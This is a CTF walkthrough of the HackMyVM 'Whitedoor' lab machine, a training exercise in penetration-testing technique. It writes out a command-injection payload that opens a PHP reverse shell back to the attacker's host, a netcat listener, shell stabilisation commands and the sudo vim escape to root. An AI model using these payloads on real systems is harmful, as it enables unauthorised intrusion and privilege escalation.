# HackMyVM - Whitedoor Walkthrough (Easy)

## Overview

Today we are solving another **Easy Level machine** from **HackMyVM** called **Whitedoor** using **Kali Linux** in a **Host-Only Adapter** lab setup.

This machine covers:

* Network Enumeration
* FTP Enumeration
* Web Fuzzing
* Command Injection
* Reverse Shell
* Shell Stabilization
* Password Decoding
* Hash Cracking
* Privilege Escalation using Vim
* GTFOBins Abuse

---

# Machine Information

| Category         | Details                                 |
| ---------------- | --------------------------------------- |
| Platform         | HackMyVM                                |
| Difficulty       | Easy                                    |
| OS               | Linux                                   |
| Attacker Machine | Kali Linux                              |
| Techniques Used  | Command Injection, Privilege Escalation |

---

# Initial Enumeration

We start both machines on the **Host-Only Adapter** network.

Unlike some HackMyVM machines, this one does not display its IP address on boot, so we use `netdiscover` to identify the target machine.

```bash
netdiscover -i eth0
```

Target IP discovered:

```bash
192.168.56.117
```

---

# Full Port Scan

We begin with a complete TCP port scan using Nmap.

```bash
nmap 192.168.56.117 -p-
```

### Scan Result

```bash
Starting Nmap 7.98 at 2026-05-29
Nmap scan report for 192.168.56.117

Host is up

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

---

# Service Version Detection

Next, we perform version detection and service enumeration.

```bash
nmap -sV -sC 192.168.56.117
```

During enumeration we notice:

* FTP Anonymous Login is enabled

---

# FTP Enumeration

We log into the FTP server anonymously.

```bash
ftp 192.168.56.117
```

Login:

```bash
Name: anonymous
Password: anonymous
```

Inside FTP we only find:

```text
¡Good luck!
```

This turns out to be a rabbit hole.

---

# Web Enumeration

Browsing to Port 80 shows a simple web page.

We inspect the page source and continue enumeration.

## Directory Fuzzing

We start fuzzing directories and endpoints.

Example:

```bash
gobuster dir -u http://192.168.56.117 -w /usr/share/wordlists/dirb/common.txt
```

During testing we discover a command execution form.

---

# Command Injection

The form claims that only the `ls` command is allowed.

However, input sanitization is weak and can be bypassed using `;`.

## Payload Used

```bash
ls;php -r '$sock=fsockopen("192.168.56.106",4444);`bash <&3 >&3 2>&3`;'
```

---

# Reverse Shell

Start a Netcat listener:

```bash
nc -lvnp 4444
```

After executing the payload, we receive a reverse shell successfully.

---

# Stabilizing the Shell

We stabilize the shell for better interaction.

## On Target

```bash
script -qc /bin/bash /dev/null
```

OR

```bash
script /dev/null -c /bin/bash
```

Then:

```bash
export TERM=xterm
```

## Background the Shell

Press:

```text
CTRL + Z
```

## On Local Machine

```bash
stty raw -echo; fg
```

Then press Enter and run:

```bash
reset
```

Now the shell is fully interactive.

---

# Finding Credentials

While enumerating files and directories we discover:

```text
whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
```

This looks like Base64 encoded data.

Using CyberChef or `base64 -d`, we decode it.

Eventually we recover credentials for the `whiteshell` user.

---

# User Enumeration

After switching users:

```bash
su whiteshell
```

We search for the user flag.

```bash
find / -type f -name 'user.txt' 2>/dev/null
```

We locate the file but do not initially have permission to read it.

---

# Hash Cracking

We find a hash file on the system and crack it using common wordlists.

Example:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

OR

```bash
hashcat -m 0 hash.txt rockyou.txt
```

After cracking the hash, we obtain the password and switch users.

---

# User Flag

Successfully reading:

```text
user.txt
```

Flag:

```text
Y0uG3tTh3Us3RFl4g!!
```

---

# Privilege Escalation

Time for root.

We start by checking sudo permissions.

```bash
sudo -l
```

Output shows:

```bash
/usr/bin/vim
```

can be executed with sudo privileges.

---

# GTFOBins Abuse

Using GTFOBins we find a Vim privilege escalation technique.

Reference:

https://gtfobins.github.io/gtfobins/vim/

Run:

```bash
sudo /usr/bin/vim
```

Inside Vim execute:

```vim
:set shell=/bin/bash
:shell
```

We are now root.

---

# Root Flag

Read the root flag:

```bash
cat /root/root.txt
```

Machine rooted successfully.

---

# Key Takeaways

This machine teaches several important penetration testing concepts:

* Basic Enumeration
* FTP Anonymous Access
* Web Application Testing
* Command Injection
* Reverse Shell Techniques
* Shell Stabilization
* Base64 Credential Discovery
* Password Cracking
* Linux Privilege Escalation
* GTFOBins Abuse

---

# Tools Used

* Nmap
* Netdiscover
* Gobuster
* Netcat
* CyberChef
* JohnTheRipper
* Hashcat
* GTFOBins

---

# Commands Summary

## Enumeration

```bash
netdiscover -i eth0
nmap 192.168.56.117 -p-
nmap -sV -sC 192.168.56.117
```

## Directory Fuzzing

```bash
gobuster dir -u http://192.168.56.117 -w /usr/share/wordlists/dirb/common.txt
```

## Reverse Shell Listener

```bash
nc -lvnp 4444
```

## Shell Stabilization

```bash
script -qc /bin/bash /dev/null
export TERM=xterm
stty raw -echo; fg
reset
```

## Privilege Escalation

```bash
sudo -l
sudo /usr/bin/vim
```

---

# Final Thoughts

Whitedoor is a great beginner-friendly machine that introduces:

* Command Injection
* Reverse Shell Handling
* Credential Discovery
* Linux Privilege Escalation

The machine is simple but very educational for anyone starting with CTFs, HackMyVM, or OSCP-style labs.

---

## Tags

`hackmyvm` `ctf` `penetration-testing` `linux-privilege-escalation` `command-injection` `reverse-shell` `ethical-hacking` `writeup` `cybersecurity` `vim-privesc` `gtfobins` `web-security`

---

Jai Shri Ram 🚩
